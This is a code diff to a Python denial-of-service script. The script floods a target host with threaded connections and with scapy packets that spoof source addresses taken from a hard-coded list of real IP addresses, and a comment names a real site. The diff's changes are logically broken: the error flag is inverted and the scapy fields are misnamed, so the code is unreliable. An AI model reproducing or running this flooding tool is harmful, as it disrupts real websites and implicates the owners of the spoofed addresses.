@@ -3,10 +3,14 @@ import threading
 from random import choice
 import requests
 import socket
-from scapy.all import *
+try:
+    from scapy.all import *
+    from scapy.layers.inet import TCP, IP
+    is_erroring = True
+except:
+    pass
 
 # http://m.bibika.ru/
-from scapy.layers.inet import TCP, IP
 
 ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']
 
@@ -47,11 +51,12 @@ def dos():
             s.close()
             i = 1
 
-            while True:
-                IP1 = IP(source_IP=choice(ips), destination=target)
-                TCP1 = TCP(srcport=choice(ips), dstport=80)
-                pkt = IP1 / TCP1
-                send(pkt, inter=.001)
+            if not is_erroring:
+                while True:
+                    IP1 = IP(source_IP=choice(ips), destination=target)
+                    TCP1 = TCP(srcport=choice(ips), dstport=80)
+                    pkt = IP1 / TCP1
+                    send(pkt, inter=.001)
         except Exception as error:
             threading.Thread(target=dos).start()
             print(error)
@@ -62,4 +67,3 @@ while True:
     threading.Thread(target=dos).start()
     print(f'Send ping to {target}:{port}')
     print(f'Numbers of attack: {attack_num}')
-
